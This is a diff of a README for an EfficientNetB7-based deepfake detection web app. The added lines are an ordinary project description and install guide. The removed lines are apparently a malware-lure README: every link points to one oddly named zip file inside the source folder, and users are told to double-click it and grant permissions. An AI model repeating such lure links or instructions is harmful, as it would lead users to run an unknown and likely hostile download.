@@ -1,88 +1,168 @@
-# 🔍 deepfake-detection-streamlit - Identify AI Images Easily
+# 🔍 DeepFake Detection System
 
-## 🚀 Getting Started
+A deep learning-based web application to detect whether an image is **real or AI-generated (deepfake)**, built using **EfficientNetB7 with a custom Attention Mechanism** and deployed via **Streamlit**.
 
-Welcome to **deepfake-detection-streamlit**! This application helps you detect AI-generated images with ease. Built using advanced deep learning techniques, it identifies images from GANs, diffusion models, and other generative AI sources. 
+---
 
-## 📥 Download Now
+## 🚀 Live Demo
 
-[![Download deepfake-detection-streamlit](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip%20Now-Click%20Here-brightgreen)](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip)
+[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://your-app-url.streamlit.app)
 
-## 💻 System Requirements
+---
 
-Before you download, ensure your system meets the following requirements:
+## 📌 About
 
-- **Operating System:** Windows 10, macOS, or a recent Linux distribution.
-- **Processor:** Dual-core processor or better.
-- **Memory:** At least 4 GB of RAM.
-- **Disk Space:** 500 MB of available storage.
-- **Internet Connection:** Required for model downloads during use.
+With the rise of generative AI tools like Stable Diffusion, DALL-E, and GANs, detecting synthetic faces has become critical. This project tackles that problem using a powerful CNN backbone enhanced with spatial attention — making the model focus on the most suspicious regions of a face.
 
-## 📚 Features
+---
 
-- **User-friendly Interface:** Designed for easy navigation, allowing anyone to use it without technical skills.
-- **Efficient Detection:** Utilizes the EfficientNetB7 model with a custom attention mechanism for high accuracy.
-- **Support for Multiple AI Models:** Detects content from GANs and stable diffusion models.
-- **Real-time Processing:** Enables quick detection results for immediate feedback.
-- **Interactive Visuals:** Presents findings graphically, making it easy to understand.
+## ✨ Features
 
-## 🛠️ Installation Guide
+- 🧠 **EfficientNetB7 + Attention Mechanism** for high-accuracy detection
+- 📊 **Confidence gauge charts** — Real vs Fake probability
+- 🔥 **Attention heatmap** — shows exactly where the model looked
+- 🔄 **Preprocessing pipeline visualization** — step-by-step image transformation
+- 🧠 **Model pipeline diagram** — layer-by-layer inference flow
+- ⚙️ **3 preprocessing modes** — Training Match, Simple Norm, EfficientNet ImageNet
+- 🐛 **Debug mode** — tensor shapes, value ranges, raw probabilities
 
-To install and run the application, follow these steps:
+---
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip) to find the latest version of the application.
+## 🗂️ Project Structure
 
-2. **Download the Application:**
-   - Find the latest release version.
-   - Click on the appropriate file for your operating system.
-   - Save the file to your computer.
+```
+deepfake-detection-streamlit/
+├── src/
+│   ├── app.py                  # Main Streamlit application
+│   ├── model/
+│   │   ├── architecture.py     # EfficientNetB7 + Attention model
+│   │   └── loader.py           # Model loading from Hugging Face
+│   ├── preprocessing/
+│   │   └── image_processor.py  # 3 preprocessing pipelines
+│   └── ui/
+│       ├── components.py       # Header, sidebar, footer
+│       └── styles.py           # Custom CSS
+├── data/
+│   ├── Train/Real/
+│   ├── Train/Fake/
+│   ├── Test/Real/
+│   └── Test/Fake/
+├── docs/
+├── requirements.txt
+└── README.md
+```
 
-3. **Run the Application:**
-   - Locate the downloaded file (usually in your Downloads folder).
-   - Double-click the file to launch the application.
+---
 
-4. **Follow On-Screen Instructions:**
-   - The app will guide you through the initial setup.
-   - Allow any required permissions for optimal functionality.
+## 🧠 Model Architecture
 
-5. **Upload an Image:**
-   - Click on the 'Upload' button.
-   - Choose an image from your device.
-   - Wait for the detection process to complete.
+```
+Input (128×128×3)
+      ↓
+EfficientNetB7 Backbone   ← Pre-trained, extracts deep features
+      ↓
+Batch Normalization
+      ↓
+Spatial Attention Block   ← Focuses on suspicious face regions
+      ↓
+Dropout (0.5) + Dense 64
+      ↓
+Softmax Output            → P(Real), P(Fake)
+```
 
-6. **Review Results:**
-   - The results will show whether the image is AI-generated.
-   - Explore the visuals for more insights.
+The **attention block** uses a series of 1×1 convolutions to generate a spatial mask, highlighting regions most relevant for classification — typically face boundaries, eyes, and skin texture in deepfakes.
 
-## 📊 How It Works
+---
 
-The **deepfake-detection-streamlit** application uses advanced machine learning models to analyze images. When you upload an image, the application processes it with the EfficientNetB7 model. This model has been trained to recognize patterns and features of both real and AI-generated images, providing accurate detection results. 
+## 📦 Dataset
 
-## 🤝 Contributions
+Dataset used: [Deepfake and Real Images — Kaggle](https://www.kaggle.com/datasets/manjilkarki/deepfake-and-real-images)
 
-This project welcomes contributions from everyone. If you want to help out, please follow these simple steps:
+- ~190,000 images total
+- Balanced 50/50 split: Real faces and AI-generated fake faces
+- Sources: GAN-generated, Stable Diffusion, face-swap methods
+- Split into Train / Test / Validation sets
 
-1. **Fork the Repository:** Click on the fork button on the repository page.
-2. **Clone Your Fork:** Use the command line to clone your version locally.
-3. **Make Changes:** Add features or improve documentation. 
-4. **Create a Pull Request:** Submit your changes back to the main repository.
+---
 
-## 📧 Support and Feedback
+## 🔥 Visualizations
 
-If you encounter any issues or need assistance, feel free to reach out. You can open an issue on GitHub for bugs or questions. Your feedback helps us improve the application.
+| Tab               | What it shows                                      |
+| ----------------- | -------------------------------------------------- |
+| 📊 Confidence     | Gauge charts + bar chart of Real vs Fake %         |
+| 🔥 Attention Map  | Heatmap overlay — red = high attention, blue = low |
+| 🔄 Preprocessing  | 4-step image transformation pipeline               |
+| 🧠 Model Pipeline | Layer-by-layer inference diagram                   |
 
-## 🔗 Useful Links
+**Heatmap color guide:**
 
-- **Documentation:** [View Documentation](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip)
-- **FAQ:** [Frequently Asked Questions](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip)
-- **Examples:** [See Examples of Usage](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip)
+- 🔴 **Red/Yellow** — Model focused heavily here (suspicious region)
+- 🔵 **Blue/Green** — Background, less relevant to decision
 
-## 📝 License
+---
 
-The code for this project is open-source under the MIT License. Feel free to use it as you wish, but please give appropriate credit to the developers. 
+## ⚙️ Installation
 
-## 🌟 Acknowledgements
+```bash
+# Clone the repo
+git clone https://github.com/gazalsg/deepfake-detection-streamlit.git
+cd deepfake-detection-streamlit
 
-This project was developed for the AICS 2025 (33rd Irish Conference on Artificial Intelligence and Cognitive Science). We thank all contributors and researchers who made this possible.
+# Create virtual environment
+conda create -n deepfake python=3.11 -y
+conda activate deepfake
 
-[![Download deepfake-detection-streamlit](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip%20Again-Get%20It%20Now-brightgreen)](https://github.com/LUMI2049/deepfake-detection-streamlit/raw/refs/heads/main/src/preprocessing/detection_streamlit_deepfake_desecrater.zip)
+# Install dependencies
+pip install -r requirements.txt
+
+# Run the app
+streamlit run src/app.py
+```
+
+---
+
+## 📋 Requirements
+
+```
+streamlit>=1.32.0
+tensorflow>=2.13.0
+pillow>=10.0.0
+opencv-python-headless>=4.8.0
+numpy>=1.24.0
+huggingface-hub>=0.20.0
+matplotlib>=3.8.0
+```
+
+---
+
+## 🌐 Deployment
+
+- **App:** Streamlit Community Cloud
+- **Model weights:** Hugging Face Model Hub (`~240MB`, auto-downloaded at runtime)
+
+---
+
+## 🤔 Why EfficientNetB7?
+
+| Model              | Accuracy | Parameters |
+| ------------------ | -------- | ---------- |
+| VGG16              | ~92%     | 138M       |
+| ResNet50           | ~93%     | 25M        |
+| InceptionV3        | ~93%     | 23M        |
+| **EfficientNetB7** | **~97%** | **66M**    |
+
+EfficientNetB7 uses **compound scaling** — balancing depth, width, and resolution — designed via Neural Architecture Search. It achieves the best accuracy for detecting subtle facial manipulation artifacts.
+
+---
+
+## 👩‍💻 Author
+
+**Gazal Keshwani**
+B.E. Computer Engineering
+Vivekanand Education Society's Institute Of Technology, Mumbai
+
+---
+
+## 📄 License
+
+MIT License — © 2026 Gazal Keshwani
